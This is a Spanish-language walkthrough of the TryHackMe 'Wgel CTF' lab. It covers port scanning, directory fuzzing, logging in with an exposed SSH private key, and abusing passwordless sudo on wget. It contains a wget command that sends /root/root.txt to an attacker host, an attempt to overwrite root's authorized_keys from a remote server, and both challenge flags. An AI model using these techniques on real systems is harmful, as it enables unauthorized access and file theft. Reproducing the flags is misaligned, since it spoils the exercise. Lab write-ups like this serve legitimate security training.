# Wgel CTF

`Try Hack Me` `Linux` `SSH` `sudo` `wget`

## Flags

* **User Flag:** `057c67131c3d5e42dd5cd3075b198ff6`
* **Root Flag:** `b1b968b37519ad1daa6408188649263d`

## Users

* Jessie

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64 
>
> Windows: TTL &gt;= 65 & &lt;= 128

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

![](https://i.imgur.com/Kaxg51I.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

![](https://i.imgur.com/lyGd7i2.png)

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/p8AOFkK.png)

Vemos que es un Apache normal. Accedemos al portal web y vemos la página por defecto de apache. Vemos el código fuente de la página a ver si encontramos algo. Vemos un comentario interesante:

![](https://i.imgur.com/fEOhhMG.png)

{% hint style="info" %}
Tenemos un posible usuario: `**Jessie**`
{% endhint %}

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/QRMEw6K.png)

{% hint style="info" %}
Tenemos un path oculto: **`IP/sitemap`**
{% endhint %}

Al acceder, vemos una especie de blog. Dice algo de "**`unapp`**". Lo buscamos y vemos que es una [plantilla](https://colorlib.com/wp/template/unapp/) para hacer webs.

![](https://i.imgur.com/etXh7eb.png)

Buscamos vulnerabilidades sobre unapp pero no hay nada.

Lanzamos un nuevo fuzzing sobre **`IP/sitemap`**:

![](https://i.imgur.com/eO9ibpM.png)

{% hint style="info" %}
Tenemos un directorio interesante `**IP/sitemap/.ssh**`
{% endhint %}

Al entrar hay una clave privada RSA

![](https://i.imgur.com/Ykjsfbh.png)

## **Getting a shell**

Probamos a utilizar la llave privada encontrada con el usuario **Jessie** por SSH:

`ssh -i id_rsa jessie@IP`

![](https://i.imgur.com/qi1w86L.png)

### **User Flag**

Buscamos la flag en su directorio home. La encontramos en Documents:

![](https://i.imgur.com/fIPw2ru.png)

{% hint style="success" %}
USER FLAG: **`057c67131c3d5e42dd5cd3075b198ff6`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario jessie. Ejecutamos `sudo -l`.

![](https://i.imgur.com/i4FmAtp.png)

Vemos que puede ejecutar todo como sudo con password \(no la tenemos\) y **`/usr/bin/wget`** sin password.

Seguimos esta guía para escalar privilegios:

{% embed url="https://gtfobins.github.io/gtfobins/wget/\#sudo" caption="" %}

También podriamos intentar esta [otra guía](https://vk9-sec.com/wget-privilege-escalation/) pero no tenemos la password de Jessie.

### Wget to upload a file

Como tenemos la clave privada SSH de Jessie, podemos escalar privilegios copiando la clave pública SSH de Jessie al directorio /root.

Primero vemos el fichero `**/home/jessie/authorized_keys**` y copiamos el contenido en un fichero local del kali.

![](https://i.imgur.com/OqfwGqk.png)

{% hint style="info" %}
Levantamos un servidor con Python para compartir el fichero `**python -m SimpleHTTPServer 8888**`
{% endhint %}

Copiamos el fichero en el home de root con:

```bash
    sudo wget IP:8888/keys -O /root/.ssh/authorized_keys
```

No funciona porque no existe el directorio **/root/.ssh**

### Wget to read a file

Probamos directamente a descargar la flag de root tal como explicaba en esta otra guía:

Lanzamos el siguiente comando:

```bash
    sudo /usr/bin/wget –post-file=/root/root.txt IP
```

![](https://i.imgur.com/9VS624X.png)

Falla con `**root.txt**` y probamos con **`root_flag.txt`** \(como la de user\).

### **Root Flag**

No hemos escalado privilegios pero tenemos la **root** flag.

{% hint style="success" %}
ROOT FLAG: **`b1b968b37519ad1daa6408188649263d`**
{% endhint %}

